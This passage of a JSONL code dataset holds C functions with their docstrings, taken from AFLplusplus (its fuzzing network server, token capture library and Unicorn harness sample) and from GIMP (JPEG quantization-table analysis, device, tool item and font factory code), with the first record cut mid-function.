\"abort_on_error=1:\"\n         \"detect_leaks=0:\"\n         \"symbolize=0:\"\n         \"allocator_may_return_null=1\",\n         0);\n\n  setenv(\"MSAN_OPTIONS\", \"exit_code=\" STRINGIFY(MSAN_ERROR) \":\"\n                         \"symbolize=0:\"\n                         \"abort_on_error=1:\"\n                         \"allocator_may_return_null=1:\"\n                         \"msan_track_origins=0\", 0);\n\n  if (get_afl_env(\"AFL_PRELOAD\")) {\n\n    if (fsrv->qemu_mode) {\n\n      u8 *qemu_preload = getenv(\"QEMU_SET_ENV\");\n      u8 *afl_preload = getenv(\"AFL_PRELOAD\");\n      u8 *buf;\n\n      s32 i, afl_preload_size = strlen(afl_preload);\n      for (i = 0; i < afl_preload_size; ++i) {\n\n        if (afl_preload[i] == ',') {\n\n          PFATAL(\n              \"Comma (',') is not allowed in AFL_PRELOAD when -Q is \"\n              \"specified!\");\n\n        }\n\n      }\n\n      if (qemu_preload) {\n\n        buf = alloc_printf(\"%s,LD_PRELOAD=%s,DYLD_INSERT_LIBRARIES=%s\",\n                           qemu_preload, afl_preload, afl_preload);\n\n      } else {\n\n        buf = alloc_printf(\"LD_PRELOAD=%s,DYLD_INSERT_LIBRARIES=%s\",\n                           afl_preload, afl_preload);\n\n      }\n\n      setenv(\"QEMU_SET_ENV\", buf, 1);\n\n      afl_free(buf);\n\n    } else {\n\n      setenv(\"LD_PRELOAD\", getenv(\"AFL_PRELOAD\"), 1);\n      setenv(\"DYLD_INSERT_LIBRARIES\", getenv(\"AFL_PRELOAD\"), 1);\n\n    }\n\n  }\n\n}", "path": "AFLplusplus/utils/afl_network_proxy/afl-network-server.c", "commit_date": "2020-12-01 00:00:00", "repo_name": "AFLplusplus/AFLplusplus", "stars": 4507, "license": "apache-2.0", "language": "c", "size": 32305}
{"docstring": "/* Setup signal handlers, duh. */\n", "func_signal": "static void setup_signal_handlers(void)", "code": "{\n\n  struct sigaction sa;\n\n  sa.sa_handler = NULL;\n  sa.sa_flags = SA_RESTART;\n  sa.sa_sigaction = NULL;\n\n  sigemptyset(&sa.sa_mask);\n\n  /* Various ways of saying \"stop\". */\n\n  sa.sa_handler = handle_stop_sig;\n  sigaction(SIGHUP, &sa, NULL);\n  sigaction(SIGINT, &sa, NULL);\n  sigaction(SIGTERM, &sa, NULL);\n\n}", "path": "AFLplusplus/utils/afl_network_proxy/afl-network-server.c", "commit_date": "2020-12-01 00:00:00", "repo_name": "AFLplusplus/AFLplusplus", "stars": 4507, "license": "apache-2.0", "language": "c", "size": 32305}
{"docstring": "/*\n * libXML wrappers\n */\n", "func_signal": "int xmlStrncmp(const char *s1, const char *s2, int len)", "code": "{\n\n  if (len <= 0) { return 0; }\n  if (s1 == s2) { return 0; }\n  if (s1 == NULL) { return -1; }\n  if (s2 == NULL) { return 1; }\n  return strncmp(s1, s2, (size_t)len);\n\n}", "path": "AFLplusplus/utils/libtokencap/libtokencap.so.c", "commit_date": "2020-12-09 00:00:00", "repo_name": "AFLplusplus/AFLplusplus", "stars": 4507, "license": "apache-2.0", "language": "c", "size": 32305}
{"docstring": "/* Execute target application. Returns 0 if the changes are a dud, or\n   1 if they should be kept. */\n", "func_signal": "static u8 run_target(afl_forkserver_t *fsrv, char **argv, u8 *mem, u32 len,\n                     u8 first_run)", "code": "{\n\n  afl_fsrv_write_to_testcase(fsrv, mem, len);\n\n  fsrv_run_result_t ret =\n      afl_fsrv_run_target(fsrv, fsrv->exec_tmout, &stop_soon);\n\n  if (ret == FSRV_RUN_ERROR) { FATAL(\"Couldn't run child\"); }\n\n  if (stop_soon) {\n\n    SAYF(cRST cLRD \"\\n+++ aborted by user +++\\n\" cRST);\n    exit(1);\n\n  }\n\n  return ret;\n\n}", "path": "AFLplusplus/utils/afl_network_proxy/afl-network-server.c", "commit_date": "2020-12-01 00:00:00", "repo_name": "AFLplusplus/AFLplusplus", "stars": 4507, "license": "apache-2.0", "language": "c", "size": 32305}
{"docstring": "/* Dump an interesting token to output file, quoting and escaping it\n   properly. */\n", "func_signal": "static void __tokencap_dump(const u8 *ptr, size_t len, u8 is_text)", "code": "{\n\n  u8  buf[MAX_AUTO_EXTRA * 4 + 1];\n  u32 i;\n  u32 pos = 0;\n\n  if (len < MIN_AUTO_EXTRA || len > MAX_AUTO_EXTRA || __tokencap_out_file == -1)\n    return;\n\n  for (i = 0; i < len; i++) {\n\n    if (is_text && !ptr[i]) break;\n\n    switch (ptr[i]) {\n\n      case 0 ... 31:\n      case 127 ... 255:\n      case '\\\"':\n      case '\\\\':\n\n        sprintf(buf + pos, \"\\\\x%02x\", ptr[i]);\n        pos += 4;\n        break;\n\n      default:\n        buf[pos++] = ptr[i];\n\n    }\n\n  }\n\n  buf[pos] = 0;\n\n  int wrt_ok = (1 == write(__tokencap_out_file, \"\\\"\", 1));\n  wrt_ok &= (pos == write(__tokencap_out_file, buf, pos));\n  wrt_ok &= (2 == write(__tokencap_out_file, \"\\\"\\n\", 2));\n\n}", "path": "AFLplusplus/utils/libtokencap/libtokencap.so.c", "commit_date": "2020-12-09 00:00:00", "repo_name": "AFLplusplus/AFLplusplus", "stars": 4507, "license": "apache-2.0", "language": "c", "size": 32305}
{"docstring": "/* returns the filesize in bytes, -1 or error. */\n", "func_signal": "static off_t afl_mmap_file(char *filename, char **buf_ptr)", "code": "{\n\n    off_t ret = -1;\n\n    int fd = open(filename, O_RDONLY);\n\n    struct stat st = {0};\n    if (fstat(fd, &st)) goto exit;\n\n    off_t in_len = st.st_size;\n    if (in_len == -1) {\n\t/* This can only ever happen on 32 bit if the file is exactly 4gb. */\n\tfprintf(stderr, \"Filesize of %s too large\", filename);\n\tgoto exit;\n    }\n\n    *buf_ptr = mmap(0, in_len, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);\n\n    if (*buf_ptr != MAP_FAILED) ret = in_len;\n\nexit:\n    close(fd);\n    return ret;\n\n}", "path": "AFLplusplus/unicorn_mode/samples/c/harness.c", "commit_date": "2020-06-02 00:00:00", "repo_name": "AFLplusplus/AFLplusplus", "stars": 4507, "license": "apache-2.0", "language": "c", "size": 32305}
{"docstring": "/*\nThe sample uses strlen, since we don't have a loader or libc, we'll fake it.\nWe know the strlen will return the lenght of argv[1] that we just planted.\nIt will be a lot faster than an actual strlen for this specific purpose.\n*/\n", "func_signal": "static void hook_strlen(uc_engine *uc, uint64_t address, uint32_t size, void *user_data)", "code": "{\n    //Hook\n    //116b:       e8 c0 fe ff ff          call   1030 <strlen@plt>\n    // We place the return at RAX\n    //printf(\"Strlen hook at addr 0x%llx (size: 0x%x), result: %ld\\n\", address, size, current_input_len);\n    uc_reg_write(uc, UC_X86_REG_RAX, &current_input_len);\n    // We skip the actual call by updating RIP\n    uint64_t next_addr = address + size; \n    uc_reg_write(uc, UC_X86_REG_RIP, &next_addr);\n}", "path": "AFLplusplus/unicorn_mode/samples/c/harness.c", "commit_date": "2020-06-02 00:00:00", "repo_name": "AFLplusplus/AFLplusplus", "stars": 4507, "license": "apache-2.0", "language": "c", "size": 32305}
{"docstring": "/* Unicorn page needs to be 0x1000 aligned, apparently */\n", "func_signal": "static uint64_t pad(uint64_t size)", "code": "{\n    if (size % ALIGNMENT == 0) return size;\n    return ((size / ALIGNMENT) + 1) * ALIGNMENT;\n}", "path": "AFLplusplus/unicorn_mode/samples/c/harness.c", "commit_date": "2020-06-02 00:00:00", "repo_name": "AFLplusplus/AFLplusplus", "stars": 4507, "license": "apache-2.0", "language": "c", "size": 32305}
{"docstring": "/* Init code to open init the library. */\n", "func_signal": "__attribute__((constructor)) void __compcov_init(void)", "code": "{\n\n  if (getenv(\"AFL_QEMU_COMPCOV_DEBUG\") != NULL)\n    debug_fd =\n        open(\"compcov.debug\", O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0644);\n\n  __compcov_load();\n\n}", "path": "AFLplusplus/qemu_mode/libcompcov/libcompcov.so.c", "commit_date": "2020-05-12 00:00:00", "repo_name": "AFLplusplus/AFLplusplus", "stars": 4507, "license": "apache-2.0", "language": "c", "size": 32305}
{"docstring": "/* Main entry point */\n", "func_signal": "int main(int argc, char **argv_orig, char **envp)", "code": "{\n\n  s32    opt, s, sock, on = 1, port = -1;\n  u8     mem_limit_given = 0, timeout_given = 0, unicorn_mode = 0, use_wine = 0;\n  char **use_argv;\n  struct sockaddr_in6 serveraddr, clientaddr;\n  int                 addrlen = sizeof(clientaddr);\n  char                str[INET6_ADDRSTRLEN];\n  char **             argv = argv_cpy_dup(argc, argv_orig);\n  u8 *                send_buf;\n#ifdef USE_DEFLATE\n  u32 *lenptr;\n#endif\n\n  afl_forkserver_t  fsrv_var = {0};\n  afl_forkserver_t *fsrv = &fsrv_var;\n  afl_fsrv_init(fsrv);\n  map_size = get_map_size();\n  fsrv->map_size = map_size;\n\n  if ((send_buf = malloc(map_size + 4)) == NULL) PFATAL(\"malloc\");\n\n  while ((opt = getopt(argc, argv, \"+i:f:m:t:QUWh\")) > 0) {\n\n    switch (opt) {\n\n      case 'i':\n\n        if (port > 0) { FATAL(\"Multiple -i options not supported\"); }\n        port = atoi(optarg);\n        if (port < 1 || port > 65535)\n          FATAL(\"invalid port definition, must be between 1-65535: %s\", optarg);\n        break;\n\n      case 'f':\n\n        if (out_file) { FATAL(\"Multiple -f options not supported\"); }\n        fsrv->use_stdin = 0;\n        out_file = optarg;\n        break;\n\n      case 'm': {\n\n        u8 suffix = 'M';\n\n        if (mem_limit_given) { FATAL(\"Multiple -m options not supported\"); }\n        mem_limit_given = 1;\n\n        if (!optarg) { FATAL(\"Wrong usage of -m\"); }\n\n        if (!strcmp(optarg, \"none\")) {\n\n          fsrv->mem_limit = 0;\n          break;\n\n        }\n\n        if (sscanf(optarg, \"%llu%c\", &fsrv->mem_limit, &suffix) < 1 ||\n            optarg[0] == '-') {\n\n          FATAL(\"Bad syntax used for -m\");\n\n        }\n\n        switch (suffix) {\n\n          case 'T':\n            fsrv->mem_limit *= 1024 * 1024;\n            break;\n          case 'G':\n            fsrv->mem_limit *= 1024;\n            break;\n          case 'k':\n            fsrv->mem_limit /= 1024;\n            break;\n          case 'M':\n            break;\n\n          default:\n            FATAL(\"Unsupported suffix or bad syntax for -m\");\n\n        }\n\n        if (fsrv->mem_limit < 5) { FATAL(\"Dangerously low value of -m\"); }\n\n        if (sizeof(rlim_t) == 4 && fsrv->mem_limit > 2000) {\n\n          FATAL(\"Value of -m out of range on 32-bit systems\");\n\n        }\n\n      }\n\n      break;\n\n      case 't':\n\n        if (timeout_given) { FATAL(\"Multiple -t options not supported\"); }\n        timeout_given = 1;\n\n        if (!optarg) { FATAL(\"Wrong usage of -t\"); }\n\n        fsrv->exec_tmout = atoi(optarg);\n\n        if (fsrv->exec_tmout < 10 || optarg[0] == '-') {\n\n          FATAL(\"Dangerously low value of -t\");\n\n        }\n\n        break;\n\n      case 'Q':\n\n        if (fsrv->qemu_mode) { FATAL(\"Multiple -Q options not supported\"); }\n        if (!mem_limit_given) { fsrv->mem_limit = MEM_LIMIT_QEMU; }\n\n        fsrv->qemu_mode = 1;\n        break;\n\n      case 'U':\n\n        if (unicorn_mode) { FATAL(\"Multiple -Q options not supported\"); }\n        if (!mem_limit_given) { fsrv->mem_limit = MEM_LIMIT_UNICORN; }\n\n        unicorn_mode = 1;\n        break;\n\n      case 'W':                                           /* Wine+QEMU mode */\n\n        if (use_wine) { FATAL(\"Multiple -W options not supported\"); }\n        fsrv->qemu_mode = 1;\n        use_wine = 1;\n\n        if (!mem_limit_given) { fsrv->mem_limit = 0; }\n\n        break;\n\n      case 'h':\n        usage(argv[0]);\n        return -1;\n        break;\n\n      default:\n        usage(argv[0]);\n\n    }\n\n  }\n\n  if (optind == argc || port < 1) { usage(argv[0]); }\n\n  check_environment_vars(envp);\n\n  sharedmem_t shm = {0};\n  fsrv->trace_bits = afl_shm_init(&shm, map_size, 0);\n\n  in_data = afl_realloc((void **)&in_data, 65536);\n  if (unlikely(!in_data)) { PFATAL(\"Alloc\"); }\n\n  atexit(at_exit_handler);\n  setup_signal_handlers();\n\n  set_up_environment(fsrv);\n\n  fsrv->target_path = find_binary(argv[optind]);\n  detect_file_args(argv + optind, out_file, &fsrv->use_stdin);\n\n  if (fsrv->qemu_mode) {\n\n    if (use_wine) {\n\n      use_argv = get_wine_argv(argv[0], &fsrv->target_path, argc - optind,\n                               argv + optind);\n\n    } else {\n\n      use_argv = get_qemu_argv(argv[0], &fsrv->target_path, argc - optind,\n                               argv + optind);\n\n    }\n\n  } else {\n\n    use_argv = argv + optind;\n\n  }\n\n  if ((sock = socket(AF_INET6, SOCK_STREAM, 0)) < 0) PFATAL(\"socket() failed\");\n\n#ifdef SO_REUSEADDR\n  if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on)) < 0) {\n\n    WARNF(\"setsockopt(SO_REUSEADDR) failed\");\n\n  }\n\n#endif\n\n#ifdef SO_PRIORITY\n  int priority = 7;\n  if (setsockopt(sock, SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority)) <\n      0) {\n\n    priority = 6;\n    if (setsockopt(sock, SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority)) <\n        0)\n      WARNF(\"could not set priority on socket\");\n\n  }\n\n#endif\n\n  memset(&serveraddr, 0, sizeof(serveraddr));\n  serveraddr.sin6_family = AF_INET6;\n  serveraddr.sin6_port = htons(port);\n  serveraddr.sin6_addr = in6addr_any;\n\n  if (bind(sock, (struct sockaddr *)&serveraddr, sizeof(serveraddr)) < 0)\n    PFATAL(\"bind() failed\");\n\n  if (listen(sock, 1) < 0) { PFATAL(\"listen() failed\"); }\n\n  afl_fsrv_start(\n      fsrv, use_argv, &stop_soon,\n      (get_afl_env(\"AFL_DEBUG_CHILD\") || get_afl_env(\"AFL_DEBUG_CHILD_OUTPUT\"))\n          ? 1\n          : 0);\n\n#ifdef USE_DEFLATE\n  compressor = libdeflate_alloc_compressor(1);\n  decompressor = libdeflate_alloc_decompressor();\n  buf2 = afl_realloc((void **)&buf2, map_size + 16);\n  buf2_len = map_size + 16;\n  if (unlikely(!buf2)) { PFATAL(\"alloc\"); }\n  lenptr = (u32 *)(buf2 + 4);\n  fprintf(stderr, \"Compiled with compression support\\n\");\n#endif\n\n  fprintf(stderr,\n          \"Waiting for incoming connection from afl-network-client on port %d \"\n          \"...\\n\",\n          port);\n\n  if ((s = accept(sock, NULL, NULL)) < 0) { PFATAL(\"accept() failed\"); }\n  fprintf(stderr, \"Received connection, starting ...\\n\");\n\n#ifdef SO_PRIORITY\n  priority = 7;\n  if (setsockopt(s, SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority)) < 0) {\n\n    priority = 6;\n    if (setsockopt(s, SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority)) < 0)\n      WARNF(\"could not set priority on socket\");\n\n  }\n\n#endif\n\n  while ((in_len = recv_testcase(s, (void **)&in_data)) > 0) {\n\n    // fprintf(stderr, \"received %u\\n\", in_len);\n    (void)run_target(fsrv, use_argv, in_data, in_len, 1);\n\n    memcpy(send_buf + 4, fsrv->trace_bits, fsrv->map_size);\n\n#ifdef USE_DEFLATE\n    memcpy(buf2, &fsrv->child_status, 4);\n    *lenptr = (u32)libdeflate_deflate_compress(\n        compressor, send_buf + 4, fsrv->map_size, buf2 + 8, buf2_len - 8);\n    // fprintf(stderr, \"COMPRESS (%u->%u): \", fsrv->map_size, *lenptr);\n    // for (u32 i = 0; i < fsrv->map_size; i++) fprintf(stderr, \"%02x\",\n    // fsrv->trace_bits[i]); fprintf(stderr, \"\\n\");\n    if (send(s, buf2, *lenptr + 8, 0) != 8 + *lenptr)\n      FATAL(\"could not send data\");\n#else\n    memcpy(send_buf, &fsrv->child_status, 4);\n    if (send(s, send_buf, fsrv->map_size + 4, 0) != 4 + fsrv->map_size)\n      FATAL(\"could not send data\");\n#endif\n\n    // fprintf(stderr, \"sent result\\n\");\n\n  }\n\n  unlink(out_file);\n  if (out_file) { ck_free(out_file); }\n  out_file = NULL;\n\n  afl_shm_deinit(&shm);\n  afl_fsrv_deinit(fsrv);\n  if (fsrv->target_path) { ck_free(fsrv->target_path); }\n  afl_free(in_data);\n#if USE_DEFLATE\n  afl_free(buf2);\n  libdeflate_free_compressor(compressor);\n  libdeflate_free_decompressor(decompressor);\n#endif\n\n  argv_cpy_free(argv);\n\n  exit(0);\n\n}", "path": "AFLplusplus/utils/afl_network_proxy/afl-network-server.c", "commit_date": "2020-12-01 00:00:00", "repo_name": "AFLplusplus/AFLplusplus", "stars": 4507, "license": "apache-2.0", "language": "c", "size": 32305}
{"docstring": "/*\n * Analyze the JPEG quantization tables and return a list of devices or\n * software that can generate the same tables and subsampling factors.\n */\n", "func_signal": "static GSList *\ndetect_source (struct jpeg_decompress_struct *cinfo,\n               gint                           num_quant_tables)", "code": "{\n  guint    lum_sum;\n  guint    chrom_sum;\n  gint     i;\n  GSList  *source_list;\n\n  /* compute sum of luminance and chrominance quantization tables */\n  lum_sum = 0;\n  chrom_sum = 0;\n  if (cinfo->quant_tbl_ptrs[0])\n    {\n      for (i = 0; i < DCTSIZE2; i++)\n        lum_sum += cinfo->quant_tbl_ptrs[0]->quantval[i];\n    }\n  if (cinfo->quant_tbl_ptrs[1])\n    {\n      for (i = 0; i < DCTSIZE2; i++)\n        chrom_sum += cinfo->quant_tbl_ptrs[1]->quantval[i];\n    }\n\n  /* there can be more than one match (if sampling factors are compatible) */\n  source_list = NULL;\n  if (chrom_sum == 0 && num_quant_tables == 1)\n    {\n      /* grayscale */\n      for (i = 0; i < G_N_ELEMENTS (quant_info); i++)\n        {\n          if (quant_info[i].lum_sum == lum_sum\n              && (quant_info[i].subsmp_h == 0\n                  || quant_info[i].subsmp_h\n                  == cinfo->comp_info[0].h_samp_factor)\n              && (quant_info[i].subsmp_v == 0\n                  || quant_info[i].subsmp_v\n                  == cinfo->comp_info[0].v_samp_factor)\n              && quant_info[i].num_quant_tables > 0)\n            {\n              source_list = g_slist_append (source_list,\n                                            (gpointer) (quant_info + i));\n            }\n        }\n    }\n  else\n    {\n      /* RGB and other color spaces */\n      for (i = 0; i < G_N_ELEMENTS (quant_info); i++)\n        {\n          if (quant_info[i].lum_sum == lum_sum\n              && quant_info[i].chrom_sum == chrom_sum\n              && (quant_info[i].subsmp_h == 0\n                  || quant_info[i].subsmp_h\n                  == cinfo->comp_info[0].h_samp_factor)\n              && (quant_info[i].subsmp_v == 0\n                  || quant_info[i].subsmp_v\n                  == cinfo->comp_info[0].v_samp_factor)\n              && (quant_info[i].num_quant_tables == num_quant_tables\n                  || quant_info[i].num_quant_tables == -num_quant_tables))\n            {\n              source_list = g_slist_append (source_list,\n                                            (gpointer) (quant_info + i));\n            }\n        }\n    }\n\n  return source_list;\n}", "path": "gimp/plug-ins/file-jpeg/jpegqual.c", "commit_date": "2018-07-11 00:00:00", "repo_name": "GNOME/gimp", "stars": 4455, "license": "other", "language": "c", "size": 694177}
{"docstring": "/*\n * Print a quantization table as a C array.\n */\n", "func_signal": "static void\nprint_ctable (gint           table_id,\n              const guint16 *quant_table,\n              gboolean       more)", "code": "{\n  gint i;\n\n  g_return_if_fail (quant_table != NULL);\n  if (table_id >= 0)\n    g_print (\"    {  /* table %d */\\n      \", table_id);\n  else\n    g_print (\"    {\\n      \");\n  for (i = 0; i < DCTSIZE2; i++)\n    {\n      if (i == DCTSIZE2 - 1)\n        g_print (\"%3d\\n\", quant_table[i]);\n      else if ((i + 1) % DCTSIZE == 0)\n        g_print (\"%3d,\\n      \", quant_table[i]);\n      else\n        g_print (\"%3d, \", quant_table[i]);\n    }\n  if (more)\n    g_print (\"    },\\n\");\n  else\n    g_print (\"    }\\n\");\n}", "path": "gimp/plug-ins/file-jpeg/jpegqual.c", "commit_date": "2018-07-11 00:00:00", "repo_name": "GNOME/gimp", "stars": 4455, "license": "other", "language": "c", "size": 694177}
{"docstring": "/*  public functions  */\n", "func_signal": "void\ngimp_devices_init (Gimp *gimp)", "code": "{\n  GimpDeviceManager *manager;\n\n  g_return_if_fail (GIMP_IS_GIMP (gimp));\n\n  manager = g_object_get_data (G_OBJECT (gimp), GIMP_DEVICE_MANAGER_DATA_KEY);\n\n  g_return_if_fail (manager == NULL);\n\n  manager = gimp_device_manager_new (gimp);\n\n  g_object_set_data_full (G_OBJECT (gimp),\n                          GIMP_DEVICE_MANAGER_DATA_KEY, manager,\n                          (GDestroyNotify) g_object_unref);\n}", "path": "gimp/app/widgets/gimpdevices.c", "commit_date": "2019-09-21 00:00:00", "repo_name": "GNOME/gimp", "stars": 4455, "license": "other", "language": "c", "size": 694177}
{"docstring": "/*\n * Check if two quantization tables are identical.\n */\n", "func_signal": "static gboolean\ncompare_tables (const guint16 *quant_table1,\n                const guint16 *quant_table2)", "code": "{\n  gint i;\n\n  g_return_val_if_fail (quant_table1 != NULL, FALSE);\n  g_return_val_if_fail (quant_table2 != NULL, FALSE);\n\n  for (i = 0; i < DCTSIZE2; i++)\n    if (quant_table1[i] != quant_table2[i])\n      return FALSE;\n  return TRUE;\n}", "path": "gimp/plug-ins/file-jpeg/jpegqual.c", "commit_date": "2018-07-11 00:00:00", "repo_name": "GNOME/gimp", "stars": 4455, "license": "other", "language": "c", "size": 694177}
{"docstring": "/*  protected functions  */\n", "func_signal": "void\ngimp_tool_item_shown_changed (GimpToolItem *tool_item)", "code": "{\n  g_signal_emit (tool_item, gimp_tool_item_signals[SHOWN_CHANGED], 0);\n\n  g_object_notify (G_OBJECT (tool_item), \"shown\");\n}", "path": "gimp/app/core/gimptoolitem.c", "commit_date": "2020-04-01 00:00:00", "repo_name": "GNOME/gimp", "stars": 4455, "license": "other", "language": "c", "size": 694177}
{"docstring": "/*\n * ... FIXME: docs\n */\n", "func_signal": "static void\nprint_unknown_tables (void)", "code": "{\n  GSList         *list;\n  GSList         *flist;\n  QuantTableData *table_data;\n  gint            num_files;\n  gint            total_files = 0;\n\n  for (list = found_tables; list; list = list->next)\n    {\n      table_data = list->data;\n\n      if (option_ctable)\n        {\n          g_print (\"  {\\n\");\n          num_files = 0;\n          for (flist = table_data->files; flist; flist = flist->next)\n            {\n              g_print(\"    /* %s */\\n\", (gchar *)(flist->data));\n              num_files++;\n            }\n\n          { /* FIXME */\n            guint    lum_sum;\n            guint    chrom_sum;\n            gint     i;\n\n            total_files += num_files;\n            lum_sum = 0;\n            chrom_sum = 0;\n            for (i = 0; i < DCTSIZE2; i++)\n              lum_sum += table_data->luminance[i];\n            for (i = 0; i < DCTSIZE2; i++)\n              chrom_sum += table_data->chrominance[i];\n            g_print (\"    /* hash 0x%x, IJG %d, lum %d, chrom %d, files: %d */\\n\",\n                     table_data->hashval,\n                     table_data->ijg_qual,\n                     lum_sum, chrom_sum,\n                     num_files);\n\n            if (chrom_sum == 0 && table_data->num_quant_tables == 1)\n              {\n                /* grayscale */\n                for (i = 0; i < G_N_ELEMENTS (quant_info); i++)\n                  {\n                    if (quant_info[i].lum_sum == lum_sum\n                        && (quant_info[i].subsmp_h == 0\n                            || quant_info[i].subsmp_h\n                            == table_data->subsmp_h)\n                        && (quant_info[i].subsmp_v == 0\n                            || quant_info[i].subsmp_v\n                            == table_data->subsmp_v)\n                        && quant_info[i].num_quant_tables > 0)\n                      {\n                        g_print(\"    XXX \\\"%s\\\", \\\"%s\\\",\\n\",\n                                quant_info[i].source_name,\n                                quant_info[i].setting_name);\n                      }\n                  }\n              }\n            else\n              {\n                /* RGB and other color spaces */\n                for (i = 0; i < G_N_ELEMENTS (quant_info); i++)\n                  {\n                    if (quant_info[i].lum_sum == lum_sum\n                        && quant_info[i].chrom_sum == chrom_sum\n                        && (quant_info[i].subsmp_h == 0\n                            || quant_info[i].subsmp_h\n                            == table_data->subsmp_h)\n                        && (quant_info[i].subsmp_v == 0\n                            || quant_info[i].subsmp_v\n                            == table_data->subsmp_v)\n                        && (quant_info[i].num_quant_tables == table_data->num_quant_tables\n                            || quant_info[i].num_quant_tables == -table_data->num_quant_tables))\n                      {\n                        g_print(\"    XXX \\\"%s\\\", \\\"%s\\\",\\n\",\n                                quant_info[i].source_name,\n                                quant_info[i].setting_name);\n                      }\n                  }\n              }\n          } /* FIXME */\n\n          g_print (\"    \\\"?\\\", \\\"? (hash %x)\\\",\\n\"\n                   \"    %d, %d,\\n    %d,\\n\",\n                   table_data->hashval,\n                   table_data->subsmp_h,\n                   table_data->subsmp_v,\n                   -table_data->num_quant_tables);\n          print_ctable (-1, table_data->luminance, TRUE);\n          print_ctable (-1, table_data->chrominance, FALSE);\n          g_print (\"  },\\n\");\n        }\n    }\n  g_print (\"/* TOTAL FILES: %d */\\n\", total_files);\n}", "path": "gimp/plug-ins/file-jpeg/jpegqual.c", "commit_date": "2018-07-11 00:00:00", "repo_name": "GNOME/gimp", "stars": 4455, "license": "other", "language": "c", "size": 694177}
{"docstring": "/*  public functions  */\n", "func_signal": "GimpDataFactory *\ngimp_font_factory_new (Gimp        *gimp,\n                       const gchar *path_property_name)", "code": "{\n  g_return_val_if_fail (GIMP_IS_GIMP (gimp), NULL);\n  g_return_val_if_fail (path_property_name != NULL, NULL);\n\n  return g_object_new (GIMP_TYPE_FONT_FACTORY,\n                       \"gimp\",               gimp,\n                       \"data-type\",          GIMP_TYPE_FONT,\n                       \"path-property-name\", path_property_name,\n                       \"get-standard-func\",  gimp_font_get_standard,\n                       NULL);\n}", "path": "gimp/app/text/gimpfontfactory.c", "commit_date": "2020-08-16 00:00:00", "repo_name": "GNOME/gimp", "stars": 4455, "license": "other", "language": "c", "size": 694177}
{"docstring": "/*\n * Some compiler told me that it needed a function called main()...\n */\n", "func_signal": "int\nmain (int   argc,\n      char *argv[])", "code": "{\n  GOptionContext *context;\n  GError         *error = NULL;\n  gint            i;\n\n  g_set_prgname (\"jpegqual\");\n\n  context =\n    g_option_context_new (\"FILE [...] - analyzes JPEG quantization tables\");\n  g_option_context_add_main_entries (context, option_entries,\n                                     NULL /* skip i18n? */);\n\n  if (! g_option_context_parse (context, &argc, &argv, &error))\n    {\n      g_printerr (\"%s\\n\", error->message);\n      g_error_free (error);\n      return EXIT_FAILURE;\n    }\n\n  if (! filenames)\n    {\n      g_printerr (\"Missing file name.  Try the option --help for help\\n\");\n      return EXIT_FAILURE;\n    }\n\n  if (!option_summary && !option_ctable && !option_table_2cols)\n    {\n      g_printerr (\"Missing output option.  Assuming that you wanted --summary.\\n\");\n      option_summary = TRUE;\n    }\n\n  for (i = 0; filenames[i]; i++)\n    {\n      if (! analyze_file (filenames[i]) && ! option_ignore_err)\n        return EXIT_FAILURE;\n    }\n\n  if (option_unknown && found_tables)\n    {\n      print_unknown_tables ();\n    }\n\n  return EXIT_SUCCESS;\n}", "path": "gimp/plug-ins/file-jpeg/jpegqual.c", "commit_date": "2018-07-11 00:00:00", "repo_name": "GNOME/gimp", "stars": 4455, "license": "other", "language": "c", "size": 694177}
{"docstring": "/*\n * Initialize the IJG quantization tables for each quality setting.\n */\n", "func_signal": "static void\ninit_ijg_tables (void)", "code": "{\n  struct jpeg_compress_struct cinfo;\n  struct jpeg_error_mgr       jerr;\n  gint                        q, i;\n\n  ijg_luminance = g_new (guint16 *, 101);\n  ijg_chrominance = g_new (guint16 *, 101);\n  for (q = 0; q <= 100; q++)\n    {\n      ijg_luminance[q] = g_new (guint16, DCTSIZE2);\n      ijg_chrominance[q] = g_new (guint16, DCTSIZE2);\n    }\n\n  cinfo.err = jpeg_std_error (&jerr);\n  jpeg_create_compress (&cinfo);\n\n  for (q = 0; q <= 100; q++)\n    {\n      jpeg_set_quality (&cinfo, q, TRUE);\n      for (i = 0; i < DCTSIZE2; i++)\n        ijg_luminance[q][i] = cinfo.quant_tbl_ptrs[0]->quantval[i];\n      for (i = 0; i < DCTSIZE2; i++)\n        ijg_chrominance[q][i] = cinfo.quant_tbl_ptrs[1]->quantval[i];\n    }\n  for (q = 0; q <= 100; q++)\n    {\n      jpeg_set_quality (&cinfo, q, FALSE);\n      for (i = 0; i < DCTSIZE2; i++)\n        ijg_luminance_nb[q][i] = cinfo.quant_tbl_ptrs[0]->quantval[i];\n      for (i = 0; i < DCTSIZE2; i++)\n        ijg_chrominance_nb[q][i] = cinfo.quant_tbl_ptrs[1]->quantval[i];\n    }\n  jpeg_destroy_compress (&cinfo);\n}", "path": "gimp/plug-ins/file-jpeg/jpegqual.c", "commit_date": "2018-07-11 00:00:00", "repo_name": "GNOME/gimp", "stars": 4455, "license": "other", "language": "c", "size": 694177}
{"docstring": "/*\n * Trivial hash function (simple, but good enough for 1 to 4 * 64 short ints).\n */\n", "func_signal": "static guint32\nhash_quant_tables (struct jpeg_decompress_struct *cinfo)", "code": "{\n  guint32 hashval;\n  gint    t;\n  gint    i;\n\n  hashval = 11;\n  for (t = 0; t < 4; t++)\n    if (cinfo->quant_tbl_ptrs[t])\n      for (i = 0; i < DCTSIZE2; i++)\n        hashval = hashval * 4177 + cinfo->quant_tbl_ptrs[t]->quantval[i];\n  return hashval;\n}", "path": "gimp/plug-ins/file-jpeg/jpegqual.c", "commit_date": "2018-07-11 00:00:00", "repo_name": "GNOME/gimp", "stars": 4455, "license": "other", "language": "c", "size": 694177}
